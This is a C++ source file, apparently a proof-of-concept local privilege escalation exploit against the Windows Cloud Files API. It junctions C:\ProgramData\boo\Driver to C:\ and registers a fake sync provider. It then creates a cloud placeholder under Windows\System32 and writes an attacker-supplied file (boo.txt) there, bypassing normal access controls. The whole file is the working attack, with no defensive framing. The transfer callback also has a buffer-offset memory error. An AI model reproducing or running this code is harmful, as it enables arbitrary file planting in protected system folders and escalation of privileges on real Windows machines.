#include<iostream>
#include<windows.h>
#include<cfapi.h>
#include "../CommonUtils/CommonUtils.h"
#include "../CommonUtils/ReparsePoint.h"
#pragma comment (lib,"..//Debug//CommonUtils.lib")


GUID ProviderId = { 0x9556dc99, 0x828c, 0x11cf, { 0x7e, 0x63, 0xc7, 0x40, 0x32, 0x00, 0xaa, 0x00 } };

ULONG g_readFileSize = NULL;
PUCHAR g_readData = NULL;

VOID DoTransferCallback(_In_ CONST CF_CALLBACK_INFO* CallbackInfo,_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters){

	ULONG length = (int)CallbackParameters->FetchData.RequiredLength.QuadPart;
	ULONG offset = (int)CallbackParameters->FetchData.RequiredFileOffset.QuadPart;

	CF_OPERATION_INFO opInfo = { 0 };
	CF_OPERATION_PARAMETERS opParams = { 0 };

	opInfo.StructSize = sizeof(CF_OPERATION_INFO);
	opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
	opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
	opInfo.TransferKey = CallbackInfo->TransferKey;

	PUCHAR WriteWords =(PUCHAR)malloc(length);
	if (WriteWords) {
		memcpy(WriteWords + offset, g_readData, length);

		opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
		opParams.TransferData.CompletionStatus = 0;
		opParams.TransferData.Buffer = WriteWords;
		opParams.TransferData.Offset = CallbackParameters->FetchData.RequiredFileOffset;
		opParams.TransferData.Length = CallbackParameters->FetchData.RequiredLength;

		printf("offset %d length %d \n", offset, length);
		HRESULT hresult = CfExecute(&opInfo, &opParams);//go!!!

		free(WriteWords);
		if (!SUCCEEDED(hresult))
			printf("CfExecute failed %x \n", hresult);
	}

}


void CreateMount() {
	if (CreateDirectory((LPCWSTR)L"C:\\ProgramData\\boo", NULL) && CreateDirectory((LPCWSTR)L"C:\\ProgramData\\boo\\Driver", NULL) || (GetLastError() == ERROR_ALREADY_EXISTS)) {
		if (!ReparsePoint::CreateMountPoint(L"C:\\ProgramData\\boo\\Driver", L"C:\\", L"")) 
			printf("Error creating mount point - %d\n", GetLastError());
	}else
		printf("Error creating directory - %d\n", GetLastError());
}


PUCHAR ReadData() {
	HANDLE handle = CreateFile((LPCWSTR)L"boo.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (handle == INVALID_HANDLE_VALUE){
		printf("CreateFile GetLastError %d\n", GetLastError());
		return NULL;
	}

	DWORD file_size = GetFileSize(handle, NULL);
	if (file_size == INVALID_FILE_SIZE) {
		printf("GetFileSize INVALID_FILE_SIZE GetLastError %d\n", GetLastError());
		CloseHandle(handle);
		return NULL;
	}

	PUCHAR pBuffer = NULL;
	pBuffer = (PUCHAR)malloc(file_size);
	if(!pBuffer){
		printf("Alloc memory failed\n");
		CloseHandle(handle);
		return NULL;
	}

	ULONG reallyRead = NULL;
	bool ret = ReadFile(handle, pBuffer, file_size, &reallyRead, NULL);
	printf("file_size %d reallyRead %d\n", file_size, reallyRead);
	if (ret && reallyRead == file_size){
		g_readFileSize = file_size;
		CloseHandle(handle);
		return pBuffer;
	}
	
	free(pBuffer);
	CloseHandle(handle);
	return NULL;
}


int main() {
	
	g_readData = ReadData();
	if (!g_readData)
		return 0;
	printf("g_readFileSize %d \n", g_readFileSize);
	CreateMount();// parper dir and  mount
	LPCWSTR RootPath = { L"C:\\ProgramData\\boo" };//===>C:\Windows\System32

	CF_SYNC_REGISTRATION reg = { 0 };
	reg.StructSize = sizeof(CF_SYNC_REGISTRATION);
	reg.ProviderName = (LPCWSTR)L"Boo";
	reg.ProviderVersion = (LPCWSTR)L"1.0";
	reg.ProviderId = ProviderId;

	CF_SYNC_POLICIES policies = { 0 };
	CF_HYDRATION_POLICY hydrationPolicy;// = { 0 };
	hydrationPolicy.Primary = CF_HYDRATION_POLICY_FULL;

	CF_POPULATION_POLICY populationPolicy; //= { 0 };
	populationPolicy.Primary = CF_POPULATION_POLICY_PARTIAL;

	policies.StructSize = sizeof(CF_SYNC_POLICIES);
	policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
	policies.Hydration = hydrationPolicy;
	policies.InSync = CF_INSYNC_POLICY_NONE;
	policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
	policies.Population = populationPolicy;

	//need to import CldApi.lib 
	HRESULT hresult = CfRegisterSyncRoot(RootPath,&reg,&policies,CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
	do{
		if (!SUCCEEDED(hresult)) {
			printf("CfRegisterSyncRoot failed %x \n", hresult);
			break;
		}
			
		CF_CALLBACK_REGISTRATION* table = new CF_CALLBACK_REGISTRATION[2];
		if (!table) {
			CfUnregisterSyncRoot(RootPath);
			break;
		}

		table[0].Callback = (CF_CALLBACK)DoTransferCallback;
		table[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;//io callback CF_CALLBACK_TYPE_FETCH_DATA
		//Ä©Î²½áÊø
		table[1].Callback = NULL;
		table[1].Type = CF_CALLBACK_TYPE_NONE;

		CF_CONNECTION_KEY key = { 0 };
		PVOID ptr = NULL;
		hresult = CfConnectSyncRoot(RootPath, table, ptr, CF_CONNECT_FLAG_NONE, &key);
		if (!SUCCEEDED(hresult)) {
			printf("CfConnectSyncRoot failed %x \n", hresult);
			delete[]table;
			table = NULL;
			CfUnregisterSyncRoot(RootPath);
			break;
		}
		
		//printf("key %d\n", key);
		CF_PLACEHOLDER_CREATE_INFO place_holders = { 0 };
		place_holders.RelativeFileName = (LPCWSTR)L"Driver\\Windows\\System32\\31.txt";

		CF_FS_METADATA meta_data = { 0 };//file base attribute
		meta_data.BasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
		meta_data.FileSize.QuadPart = g_readFileSize;
		
		PUCHAR FileIdentity[0x200] = { 0 };
		place_holders.FsMetadata = meta_data;
		place_holders.Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
		place_holders.FileIdentity = FileIdentity;
		place_holders.FileIdentityLength = 0x130;

		DWORD processed = NULL;
		hresult = CfCreatePlaceholders(RootPath, &place_holders,1, CF_CREATE_FLAG_STOP_ON_ERROR,&processed);
		if (SUCCEEDED(hresult)) {
			//printf("Are you OK? I'm Ready! \n");
			HANDLE handle = CreateFile((LPCWSTR)L"C:\\ProgramData\\boo\\Driver\\Windows\\System32\\31.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_UNPINNED, NULL);// must be FILE_ATTRIBUTE_UNPINNED
			ULONG size = 0;
			if(handle != (HANDLE)ERROR_INVALID_HANDLE){
				bool Write = WriteFile(handle, g_readData, g_readFileSize,&size,NULL);
				if (!Write)
					printf("WriteFile GetLastError %d\n", GetLastError());
				else
					printf("Successfull !!!! \n");
				CloseHandle(handle);
			}else 
				printf("CreateFile GetLastError %d\n", GetLastError());
			getchar();//WriteFile  complete
		}else
			printf("CfCreatePlaceholders failed %x \n", hresult);
		CfDisconnectSyncRoot(key);
		delete[]table;
		table = NULL;
		CfUnregisterSyncRoot(RootPath);
	} while (false);
	
	free(g_readData);

	return 0;
}


